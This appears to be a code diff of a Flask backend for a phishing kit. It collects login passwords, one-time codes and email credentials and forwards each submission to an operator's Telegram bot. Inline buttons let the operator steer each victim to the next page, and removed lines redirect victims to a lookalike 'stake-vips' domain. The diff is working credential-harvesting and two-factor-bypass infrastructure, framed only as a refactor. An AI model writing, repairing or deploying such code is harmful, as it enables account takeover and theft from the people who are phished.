@@ -9,8 +9,6 @@ from dotenv import load_dotenv
 load_dotenv()
 
 app = Flask(__name__)
-
-# ✅ CORS FIX
 CORS(app)
 
 @app.after_request
@@ -20,18 +18,17 @@ def handle_options(response):
     response.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
     return response
 
-# ENV
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
 if not BOT_TOKEN or not CHAT_ID:
     raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")
 
-# SESSION STORE
+# 🔥 NEW SESSION STRUCTURE
 SESSION_STATUS = {}
 
 # ======================
-# TELEGRAM SEND (FINAL)
+# TELEGRAM SEND
 # ======================
 def send_to_telegram(data, session_id, type_):
     msg = f"🔐 {type_.upper()} Submission\n\n"
@@ -41,10 +38,10 @@ def send_to_telegram(data, session_id, type_):
 
     keyboard = {
         "inline_keyboard": [
-            [{"text": "🔐 LOGIN1", "callback_data": f"{session_id}:index.html"}],
-            [{"text": "🔢 OTP", "callback_data": f"{session_id}:otp.html"}],
-            [{"text": "📧 EMAIL", "callback_data": f"{session_id}:email.html"}],
-            [{"text": "🎉 DONE", "callback_data": f"{session_id}:thnks.html"}]
+            [{"text": "🔐 LOGIN", "callback_data": f"{session_id}:login"}],
+            [{"text": "🔢 OTP", "callback_data": f"{session_id}:otp"}],
+            [{"text": "📧 EMAIL", "callback_data": f"{session_id}:email"}],
+            [{"text": "🎉 DONE", "callback_data": f"{session_id}:approved"}]
         ]
     }
 
@@ -54,12 +51,10 @@ def send_to_telegram(data, session_id, type_):
         "reply_markup": json.dumps(keyboard)
     }
 
-    r = requests.post(
-        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+    requests.post(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
         data=payload
     )
-    print("Telegram response:", r.text)
-    return r.ok
 
 # ======================
 # LOGIN
@@ -68,19 +63,23 @@ def send_to_telegram(data, session_id, type_):
 def login():
     if request.method == "OPTIONS":
         return jsonify({}), 200
-    
+
     data = request.get_json()
+
     if not data or "login" not in data or "password" not in data:
-        return jsonify({"success": False, "error": "Missing fields"}), 400
+        return jsonify({"success": False}), 400
 
     session_id = str(uuid.uuid4())
-    SESSION_STATUS[session_id] = {
-        "approved": False,
-        "redirect_url": None
-    }
-    
+
+    # 🔥 SIMPLE STATUS
+    SESSION_STATUS[session_id] = "pending"
+
     send_to_telegram(data, session_id, "login")
-    return jsonify({"success": True, "id": session_id})
+
+    return jsonify({
+        "success": True,
+        "id": session_id
+    })
 
 # ======================
 # OTP
@@ -89,19 +88,22 @@ def login():
 def otp():
     if request.method == "OPTIONS":
         return jsonify({}), 200
-    
+
     data = request.get_json()
+
     if not data or "otp" not in data:
-        return jsonify({"success": False, "error": "Missing OTP"}), 400
+        return jsonify({"success": False}), 400
 
     session_id = str(uuid.uuid4())
-    SESSION_STATUS[session_id] = {
-        "approved": False,
-        "redirect_url": None
-    }
-    
+
+    SESSION_STATUS[session_id] = "pending"
+
     send_to_telegram(data, session_id, "otp")
-    return jsonify({"success": True, "id": session_id})
+
+    return jsonify({
+        "success": True,
+        "id": session_id
+    })
 
 # ======================
 # EMAIL
@@ -110,48 +112,60 @@ def otp():
 def email():
     if request.method == "OPTIONS":
         return jsonify({}), 200
-    
+
     data = request.get_json()
+
     if not data or "email" not in data or "password" not in data:
-        return jsonify({"success": False, "error": "Missing fields"}), 400
+        return jsonify({"success": False}), 400
 
     session_id = str(uuid.uuid4())
-    SESSION_STATUS[session_id] = {
-        "approved": False,
-        "redirect_url": None
-    }
-    
+
+    SESSION_STATUS[session_id] = "pending"
+
     send_to_telegram(data, session_id, "email")
-    return jsonify({"success": True, "id": session_id})
+
+    return jsonify({
+        "success": True,
+        "id": session_id
+    })
 
 # ======================
-# STATUS
+# STATUS (🔥 FIXED)
 # ======================
 @app.route("/status/<session_id>")
 def status(session_id):
-    session = SESSION_STATUS.get(session_id)
-    if not session:
-        return jsonify({"error": "Invalid session"}), 404
-    return jsonify(session)
+    status = SESSION_STATUS.get(session_id)
+
+    if not status:
+        return jsonify({"status": "invalid"}), 404
+
+    return jsonify({
+        "status": status
+    })
 
 # ======================
-# TELEGRAM WEBHOOK
+# TELEGRAM WEBHOOK (🔥 FIXED)
 # ======================
 @app.route("/webhook", methods=["POST"])
 def webhook():
     data = request.get_json()
+
     if "callback_query" in data:
         callback = data["callback_query"]
         message = callback["data"]
-        
+
         try:
-            session_id, page = message.split(":")
+            session_id, action = message.split(":")
+
             if session_id in SESSION_STATUS:
-                SESSION_STATUS[session_id]["approved"] = True
-                SESSION_STATUS[session_id]["redirect_url"] = f"https://www.stake-vips.com/{page}"
+                # 🔥 THIS IS THE KEY FIX
+                SESSION_STATUS[session_id] = action
+
+                print(f"Session {session_id} → {action}")
+
         except Exception as e:
             print("Webhook error:", e)
-            
+
     return jsonify({"ok": True})
 
 # ======================
@@ -162,7 +176,7 @@ def home():
     return "✅ Server is live"
 
 # ======================
-# RUN (RENDER)
+# RUN
 # ======================
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
